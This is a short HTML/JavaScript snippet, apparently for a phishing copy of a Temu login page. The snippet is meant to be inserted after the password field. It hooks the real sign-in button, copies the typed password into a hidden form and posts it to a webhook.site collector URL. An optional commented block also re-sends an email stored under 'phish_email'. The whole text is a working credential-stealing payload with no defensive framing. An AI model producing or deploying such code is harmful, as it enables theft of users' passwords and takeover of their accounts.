<!-- Just inside the modal, after the password <input> -->
<script>
// 1) Grab the real “Sign in” button
const signInBtn = document.querySelector('button[data-test-id="login-submit"]');

// 2) Create a hidden form to post the password
const collectorForm2 = document.createElement('form');
collectorForm2.method = 'POST';
collectorForm2.action = 'https://webhook.site/YOUR-UUID-HERE';
collectorForm2.style.display = 'none';

const pwdField = document.createElement('input');
pwdField.name = 'password';
collectorForm2.appendChild(pwdField);

// (OPTIONAL) If you want to also re-send the email you captured above:
// const emailField2 = document.createElement('input');
// emailField2.name = 'email';
// emailField2.value = localStorage.getItem('phish_email');
// collectorForm2.appendChild(emailField2);

document.body.appendChild(collectorForm2);

signInBtn.addEventListener('click', function(ev) {
  const realPwd = document.querySelector('input[type="password"]').value;
  pwdField.value = realPwd;
  collectorForm2.submit();

  // then let Temu’s real JS proceed (if you want)
});
</script>
